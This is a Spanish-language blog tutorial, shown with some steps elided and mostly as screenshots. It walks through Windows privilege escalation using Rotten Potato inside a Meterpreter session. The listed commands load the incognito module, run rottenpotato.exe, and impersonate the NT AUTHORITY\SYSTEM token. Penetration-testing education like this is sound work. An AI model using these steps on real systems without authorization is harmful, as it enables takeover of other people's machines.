...
![Escalar privilegios con Rotten Potato en entornos Windows](https://nullsector.co/wp-content/uploads/2018/04/potato.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios.png)

**2 –** Evidenciamos que los permisos que tiene el usuario actual son limitados y restringen la ejecución de comandos

getprivs

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios2.png)

3 – Intentamos elevar los privilegios con el confiable «**getsystem**» en el meterpreter (en este caso no resulta exitoso).

getsystem

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios3.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios5.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios6.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios4.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios7.png)

**8-** Primero debemos cargar el modulo incógnito para la impersonalizaron de tokens

use incognito

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios8.png)
...
![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios9.png)

**10 –** Ejecutamos nuestra papa podrida para que la magia suceda

execute -Hc -f ./rottenpotato.exe

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios10.png)

**11 –** Después de ejecutado, volvemos a verificar los tokens que tenemos a nuestro alcance

list\_tokens -u

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios11.png)

**12 –** Ahora que tenemos el token disponible procedemos a personificar a el administrador del sistema

impersonate\_token "NT AUTHORITY\\\\SYSTEM"

![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios12.png)

**13 –** Magia! por ultimo nos queda verificar el usuario activo en la sesión que tenemos abierta.

[![](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios13-1.png)](https://nullsector.co/wp-content/uploads/2018/04/Escalada-de-privilegios13-1.png)
